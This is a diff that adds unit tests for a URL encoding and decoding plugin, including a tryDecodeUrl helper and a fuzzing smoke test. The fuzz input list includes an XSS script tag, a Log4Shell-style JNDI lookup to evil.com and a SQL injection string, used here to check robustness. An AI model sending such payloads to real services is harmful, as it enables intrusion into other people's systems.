@@ -2,7 +2,7 @@
  * URL Plugin — Unit Tests (pure logic)
  *
  * Covers: encodeUrl, decodeUrl, transformUrl, validateUrlInput,
- *         validateDecodeInput, getStats, formatSize
+ *         validateDecodeInput, tryDecodeUrl, getStats, formatSize
  */
 
 import { describe, it, expect } from 'vitest'
@@ -16,6 +16,7 @@ import {
   validateDecodeInput,
   getStats,
   formatSize,
+  tryDecodeUrl,
 } from '../logic'
 
 // ── encodeUrl ────────────────────────────────────────────────────────
@@ -35,17 +36,40 @@ describe('encodeUrl', () => {
     })
 
     it('encodes Chinese characters', () => {
+      expect(encodeUrl('你好', 'component')).toBe('%E4%BD%A0%E5%A5%BD')
+    })
+
+    it('encodes multi-char Chinese', () => {
       const result = encodeUrl('你好世界', 'component')
       expect(result).toBeDefined()
       expect(result).not.toBe('你好世界')
-      // Should be percent-encoded
-      expect(/^%[0-9A-F]{2}/i.test(result)).toBe(true)
+      expect(result).toBe('%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C')
     })
 
     it('encodes emoji', () => {
+      expect(encodeUrl('😀', 'component')).toBe('%F0%9F%98%80')
+    })
+
+    it('encodes emoji with text', () => {
       const result = encodeUrl('Hello 😀🚀', 'component')
       expect(result).toBeDefined()
       expect(result).not.toBe('Hello 😀🚀')
+      expect(result).toContain('%F0%9F%98%80')
+    })
+
+    it('encodes a=b&c=d as a%3Db%26c%3Dd', () => {
+      expect(encodeUrl('a=b&c=d', 'component')).toBe('a%3Db%26c%3Dd')
+    })
+
+    it('encodes full URL with component rules', () => {
+      const result = encodeUrl('https://example.com/a b?x=1&y=你好', 'component')
+      // Component mode encodes everything including : / ? & =
+      expect(result).toContain('%3A')
+      expect(result).toContain('%2F')
+      expect(result).toContain('%3F')
+      expect(result).toContain('%3D')
+      expect(result).toContain('%26')
+      expect(result).toContain('%20')
     })
 
     it('handles empty string', () => {
@@ -110,6 +134,18 @@ describe('decodeUrl', () => {
       expect(decodeUrl('hello%20world', 'component')).toBe('hello world')
     })
 
+    it('decodes Chinese percent encoding', () => {
+      expect(decodeUrl('%E4%BD%A0%E5%A5%BD', 'component')).toBe('你好')
+    })
+
+    it('decodes emoji percent encoding', () => {
+      expect(decodeUrl('%F0%9F%98%80', 'component')).toBe('😀')
+    })
+
+    it('decodes a%3Db%26c%3Dd to a=b&c=d', () => {
+      expect(decodeUrl('a%3Db%26c%3Dd', 'component')).toBe('a=b&c=d')
+    })
+
     it('decodes fully encoded URL', () => {
       expect(decodeUrl('https%3A%2F%2Fexample.com%2Fpath', 'component')).toBe(
         'https://example.com/path',
@@ -140,6 +176,14 @@ describe('decodeUrl', () => {
         'uri',
       )
       expect(result).toBe('https://example.com/my file.html?q=hello world')
+    })
+
+    it('decodes URI with Chinese', () => {
+      const result = decodeUrl(
+        'https://example.com/a%20b?x=1&y=%E4%BD%A0%E5%A5%BD',
+        'uri',
+      )
+      expect(result).toBe('https://example.com/a b?x=1&y=你好')
     })
 
     it('throws on malformed encoding', () => {
@@ -488,5 +532,223 @@ describe('formatSize', () => {
 
   it('formats MB', () => {
     expect(formatSize(2 * 1024 * 1024)).toBe('2.0 MB')
+  })
+})
+
+// ── tryDecodeUrl ──────────────────────────────────────────────────────
+
+describe('tryDecodeUrl', () => {
+  it('decodes hello%20world to hello world (component)', () => {
+    const result = tryDecodeUrl('hello%20world', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('hello world')
+    }
+  })
+
+  it('decodes Chinese percent encoding (component)', () => {
+    const result = tryDecodeUrl('%E4%BD%A0%E5%A5%BD', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('你好')
+    }
+  })
+
+  it('decodes emoji percent encoding (component)', () => {
+    const result = tryDecodeUrl('%F0%9F%98%80', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('😀')
+    }
+  })
+
+  it('decodes a%3Db%26c%3Dd to a=b&c=d (component)', () => {
+    const result = tryDecodeUrl('a%3Db%26c%3Dd', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('a=b&c=d')
+    }
+  })
+
+  it('decodes empty string to empty string', () => {
+    const result = tryDecodeUrl('', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('')
+    }
+  })
+
+  it('decodes URI with preserved structure', () => {
+    const result = tryDecodeUrl(
+      'https://example.com/a%20b?x=1&y=%E4%BD%A0%E5%A5%BD',
+      'uri',
+    )
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('https://example.com/a b?x=1&y=你好')
+    }
+  })
+
+  it('handles plain text (no percent encoding) gracefully', () => {
+    const result = tryDecodeUrl('hello world', 'component')
+    expect(result.success).toBe(true)
+    if (result.success) {
+      expect(result.value).toBe('hello world')
+    }
+  })
+
+  it('php variant always succeeds (lenient)', () => {
+    const result = tryDecodeUrl('%ZZ', 'php')
+    expect(result.success).toBe(true)
+  })
+
+  // ── Malformed inputs: friendly error, never throw ──────────────────
+
+  it('returns error for lone % (component), does NOT throw', () => {
+    let result: ReturnType<typeof tryDecodeUrl>
+    expect(() => {
+      result = tryDecodeUrl('%', 'component')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('malformed')
+    }
+  })
+
+  it('returns error for truncated %E0%A4%A (component)', () => {
+    let result: ReturnType<typeof tryDecodeUrl>
+    expect(() => {
+      result = tryDecodeUrl('%E0%A4%A', 'component')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('malformed')
+    }
+  })
+
+  it('returns error for abc%zz (component)', () => {
+    let result: ReturnType<typeof tryDecodeUrl>
+    expect(() => {
+      result = tryDecodeUrl('abc%zz', 'component')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('malformed')
+    }
+  })
+
+  it('returns error for %F0%9F (incomplete UTF-8, component)', () => {
+    let result: ReturnType<typeof tryDecodeUrl>
+    expect(() => {
+      result = tryDecodeUrl('%F0%9F', 'component')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('malformed')
+    }
+  })
+
+  it('returns error for hello%world (component)', () => {
+    let result: ReturnType<typeof tryDecodeUrl>
+    expect(() => {
+      result = tryDecodeUrl('hello%world', 'component')
+    }).not.toThrow()
+    expect(result!).toBeDefined()
+    expect(result!.success).toBe(false)
+    if (!result!.success) {
+      expect(result!.error).toContain('malformed')
+    }
+  })
+
+  it('returns error for lone % (uri)', () => {
+    const result = tryDecodeUrl('%', 'uri')
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      expect(result.error).toContain('malformed')
+    }
+  })
+
+  it('empty input returns success for all variants', () => {
+    for (const variant of ['component', 'uri', 'php'] as const) {
+      const result = tryDecodeUrl('', variant)
+      expect(result.success).toBe(true)
+      if (result.success) {
+        expect(result.value).toBe('')
+      }
+    }
+  })
+
+  // ── Roundtrip via tryDecodeUrl ─────────────────────────────────────
+
+  it('component roundtrip: encode then tryDecodeUrl returns original', () => {
+    const inputs = ['hello world', '你好', '😀', 'a=b&c=d', 'Hello World 123!']
+    for (const input of inputs) {
+      const encoded = encodeUrl(input, 'component')
+      const result = tryDecodeUrl(encoded, 'component')
+      expect(result.success).toBe(true)
+      if (result.success) {
+        expect(result.value).toBe(input)
+      }
+    }
+  })
+
+  it('uri roundtrip: encode then tryDecodeUrl returns original', () => {
+    const inputs = [
+      'https://example.com/a b?x=1&y=你好',
+      'https://example.com/my file.html',
+    ]
+    for (const input of inputs) {
+      const encoded = encodeUrl(input, 'uri')
+      const result = tryDecodeUrl(encoded, 'uri')
+      expect(result.success).toBe(true)
+      if (result.success) {
+        expect(result.value).toBe(input)
+      }
+    }
+  })
+})
+
+// ── Fuzzing smoke test ───────────────────────────────────────────────
+
+describe('tryDecodeUrl fuzzing', () => {
+  it('never throws for any input', () => {
+    const maliciousInputs = [
+      '',
+      '\x00\x00\x00',
+      '\n\t\r',
+      '<script>alert(1)</script>',
+      '${jndi:ldap://evil.com/a}',
+      "' OR '1'='1",
+      '😀😀😀',
+      'a'.repeat(10000),
+      '%',
+      '%%',
+      '%%%',
+      '%ZZ',
+      '%E0%A4%A',
+      '%F0%9F',
+      'hello%world',
+      'test%ggtest',
+      '%E0%A4%A%ZZ%F0%9F',
+      'https://example.com/%ZZ/path',
+    ]
+    for (const input of maliciousInputs) {
+      for (const variant of ['component', 'uri'] as const) {
+        expect(() => tryDecodeUrl(input, variant)).not.toThrow()
+        const result = tryDecodeUrl(input, variant)
+        expect(result).toBeDefined()
+        expect(typeof result.success).toBe('boolean')
+        if (result.success) {
+          expect(typeof result.value).toBe('string')
+        } else {
+          expect(typeof result.error).toBe('string')
+          expect(result.error.length).toBeGreaterThan(0)
+        }
+      }
+    }
   })
 })
